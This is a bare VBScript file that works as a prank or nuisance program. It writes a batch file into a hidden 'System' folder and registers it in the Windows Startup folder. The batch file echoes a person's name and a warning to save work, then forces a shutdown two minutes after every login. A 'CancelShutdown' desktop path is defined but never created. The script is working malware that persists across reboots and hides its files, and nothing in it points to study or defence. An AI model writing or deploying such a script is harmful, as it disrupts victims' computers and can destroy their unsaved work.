Dim objShell, objFSO, objStartUpFolder, objShortcut, strAppPath
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

strAppPath = objShell.CurrentDirectory
strShutdownScriptDir = strAppPath & "\System"
strShutdownScriptPath = strShutdownScriptDir & "\AutoShutdown.bat"
strShutdownLinkPath = objShell.SpecialFolders("Startup") & "\AutoShutdown.lnk"
strDesktopPath = objShell.SpecialFolders("Desktop") & "\CancelShutdown.lnk"

If Not objFSO.FolderExists(strShutdownScriptDir) Then
    objFSO.CreateFolder(strShutdownScriptDir)
End If

Set objBatch = objFSO.CreateTextFile(strShutdownScriptPath, True)
objBatch.WriteLine("@echo off")
objBatch.WriteLine("echo 沈禧烨nbnbnbnbnbnb")
objBatch.WriteLine("echo 没保存的文件记得保存没保存的文件记得保存没保存的文件记得保存")
objBatch.WriteLine("shutdown -s -t 120")
objBatch.Close

objFSO.GetFolder(strShutdownScriptDir).Attributes = objFSO.GetFolder(strShutdownScriptDir).Attributes + 2

Set objShortcut = objShell.CreateShortcut(strShutdownLinkPath)
objShortcut.TargetPath = strShutdownScriptPath
objShortcut.Save